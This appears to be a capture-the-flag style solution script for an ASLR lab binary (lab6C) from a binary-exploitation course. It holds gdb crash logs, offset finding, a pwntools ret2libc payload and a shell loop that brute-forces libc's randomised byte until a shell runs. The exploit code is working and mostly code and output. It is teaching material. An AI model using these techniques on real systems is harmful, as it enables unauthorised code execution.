# -*- coding: utf-8 -*-

# Check security
'''
❯ cat /proc/sys/kernel/randomize_va_space
checksec $bin_name
2
[*] '/home/karmaz/MBE/6_ASLR/lab6C'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''

# Vuln code fragment 'i <= 40' should be 'i < 40'
'''
    /* Read and copy the username to our savestate */
    fgets(readbuf, 128, stdin);
    for(i = 0; i <= 40 && readbuf[i]; i++)
        save->username[i] = readbuf[i];
'''
# 41st byte of the first input line is the integer controlling the message length, since 41st byte of `readbuff` will overwrite `msglen`
'''
strncpy(save->tweet, readbuf, save->msglen);
    V
char *strncpy(char *__restrict__ __dest, const char *__restrict__ __src, size_t __n)
'''

# Find vulnerability - \xFF - sets the length to 256 
'''
gdb-peda$ r < <(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFF`cyclic 300`")
Starting program: /home/karmaz/MBE/6_ASLR/lab6C < <(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFF`cyclic 300`")
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x61746361 ('acta')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xf7fa7000 --> 0x1ead6c 
EBP: 0x61756361 ('acua')
ESP: 0xffffce70 ("acwaacxaacyaac\n")
EIP: 0x61766361 ('acva')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x61766361
[------------------------------------stack-------------------------------------]
0000| 0xffffce70 ("acwaacxaacyaac\n")
0004| 0xffffce74 ("acxaacyaac\n")
0008| 0xffffce78 ("acyaac\n")
0012| 0xffffce7c --> 0xa6361 ('ac\n')
0016| 0xffffce80 --> 0x0 
0020| 0xffffce84 --> 0x0 
0024| 0xffffce88 --> 0x0 
0028| 0xffffce8c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x61766361 in ?? ()
gdb-peda$ 

❯ cyclic -l acva
282
'''
# Control EIP @ 282
'''
gdb-peda$ r < <(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFF`python -c 'print \"B\" * 282 + \"C\"*4'`")
[----------------------------------registers-----------------------------------]
EAX: 0xf 
EBX: 0x42424242 ('BBBB')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa7000 --> 0x1ead6c 
EDI: 0xf7fa7000 --> 0x1ead6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xffffce70 --> 0xa ('\n')
EIP: 0x43434343 ('CCCC')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xffffce70 --> 0xa ('\n')
0004| 0xffffce74 --> 0x0 
0008| 0xffffce78 --> 0x0 
0012| 0xffffce7c --> 0x0 
0016| 0xffffce80 --> 0x0 
0020| 0xffffce84 --> 0x0 
0024| 0xffffce88 --> 0x0 
0028| 0xffffce8c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
'''
# Check system() addr = 0xf7e01830 => "0\x18\xe0\xf7"
'''
p system
$4 = {<text variable, no debug info>} 0xf7e01830 <system>
'''

# Check "/bin/sh" addr = 0xf7f4e352 => "R\xe3\xf4\xf7"
'''
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4e352 ("/bin/sh")
'''


# Exploit w/o ASLR:
'''
db-peda$ r < <(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFF`python -c 'print \"B\" * 282 + \"0\x18\xe0\xf7" + \"TRAS\" + \"R\xe3\xf4\xf7\"'`")
Starting program: /home/karmaz/MBE/6_ASLR/lab6C < <(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFF`python -c 'print \"B\" * 282 + \"0\x18\xe0\xf7" + \"TRAS\" + \"R\xe3\xf4\xf7\"'`")
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Tweet @Unix-Dude
>>: >: Tweet sent!
[Attaching after process 95419 vfork to child process 95425]
[New inferior 2 (process 95425)]
[Detaching vfork parent process 95419 after child exec]
[Inferior 1 (process 95419) detached]
process 95425 is executing new program: /usr/bin/dash
[Attaching after process 95425 fork to child process 95426]
[New inferior 3 (process 95426)]
[Detaching after fork from parent process 95425]
[Inferior 2 (process 95425) detached]
process 95426 is executing new program: /usr/bin/dash
[Inferior 3 (process 95426) exited normally]
Warning: not running
'''

# ASLR changes only one byte of system() addr
'''
$1 = {<text variable, no debug info>} 0xf7d70830 <system>
$2 = {<text variable, no debug info>} 0xf7d81830 <system>
$3 = {<text variable, no debug info>} 0xf7dbe830 <system>
'''

# ASLR changes only one byte of "/bin/sh" addr
'''
libc : 0xf7eff352 ("/bin/sh")
libc : 0xf7ea8352 ("/bin/sh")
libc : 0xf7edb352 ("/bin/sh"
'''

# exploit by brute force one byte with relative addressing using libc base addr
'''
gdb-peda$ vmmap libc
Start      End        Perm      Name
0xf7dbc000 0xf7dd9000 r--p      /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7dd9000 0xf7f34000 r-xp      /usr/lib/i386-linux-gnu/libc-2.31.so  <==
0xf7f34000 0xf7fa4000 r--p      /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fa4000 0xf7fa5000 ---p      /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fa5000 0xf7fa7000 r--p      /usr/lib/i386-linux-gnu/libc-2.31.so
0xf7fa7000 0xf7fa9000 rw-p      /usr/lib/i386-linux-gnu/libc-2.31.so

gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e01830 <system>

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4e352 ("/bin/sh")
'''
# Calculate system and /bin/sh relative addr
'''
0xf7e01830 - 0xf7dd9000 = 0x28830
0xf7f4e352 - 0xf7dd9000 = 0x175352
'''

# Exploit will brute force  0xf7|dd|9000 - "\xdd" byte by running script in while(true)

from pwn import *

random_libc = 0xf7dd9000
system_addr = random_libc + 0x28830
bin_sh_addr = random_libc + 0x175352

buf = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xFF" # Buffer length set to 256
buf += "B" * 282 # EIP CONTROL
buf += p32(system_addr) # system_addr
buf += "XXXX" # Trash return addr
buf += p32(bin_sh_addr) 

print(buf)


# python cracker_lab6C.py > exploit.txt
# while true; do (cat exploit.txt; echo id) | ./lab6C | grep "uid" -A 10; done
'''
❯ while true; do (cat exploit.txt; echo id) | ./lab6C | grep "uid" -A 10; done
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
uid=1000(karmaz) gid=1000(karmaz) groups=1000(karmaz)  <== It's working
*** stack smashing detected ***: terminated
'''